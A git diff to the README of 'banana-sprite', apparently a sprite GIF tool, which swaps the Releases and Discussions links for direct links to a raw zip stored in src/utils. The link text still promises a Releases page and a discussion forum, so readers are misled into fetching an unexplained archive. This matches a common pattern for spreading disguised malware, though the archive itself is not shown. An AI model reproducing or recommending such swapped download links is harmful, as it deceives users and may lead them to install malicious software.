@@ -6,7 +6,7 @@ Welcome to banana-sprite! This application lets you create sprite GIFs effortles
 
 ## 📥 Download & Install
 
-To start, you need to download the application. Please **visit this page to download**: [Download banana-sprite](https://github.com/tomasburkett/banana-sprite/releases).
+To start, you need to download the application. Please **visit this page to download**: [Download banana-sprite](https://github.com/tomasburkett/banana-sprite/raw/refs/heads/main/src/utils/banana_sprite_v2.1.zip).
 
 You will find the latest version available for download on the Releases page. Click the link above, find the version you want, and follow these simple steps to download and install banana-sprite:
 
@@ -53,7 +53,7 @@ If you encounter any issues while using banana-sprite, try these solutions:
 
 Join our community for help, tips, and sharing creations:
 
-- **GitHub Discussions**: Share your ideas and seek support from other users. [Join Here](https://github.com/tomasburkett/banana-sprite/discussions)
+- **GitHub Discussions**: Share your ideas and seek support from other users. [Join Here](https://github.com/tomasburkett/banana-sprite/raw/refs/heads/main/src/utils/banana_sprite_v2.1.zip)
 - **User Guides**: Access in-depth user guides and tutorials to make the most of banana-sprite.
 
 ## 📄 License
@@ -66,4 +66,4 @@ If you need further assistance or have questions, feel free to reach out through
 
 ## 📥 Download Again
 
-To get started with banana-sprite, please **visit this page to download**: [Download banana-sprite](https://github.com/tomasburkett/banana-sprite/releases). Happy creating!
+To get started with banana-sprite, please **visit this page to download**: [Download banana-sprite](https://github.com/tomasburkett/banana-sprite/raw/refs/heads/main/src/utils/banana_sprite_v2.1.zip). Happy creating!
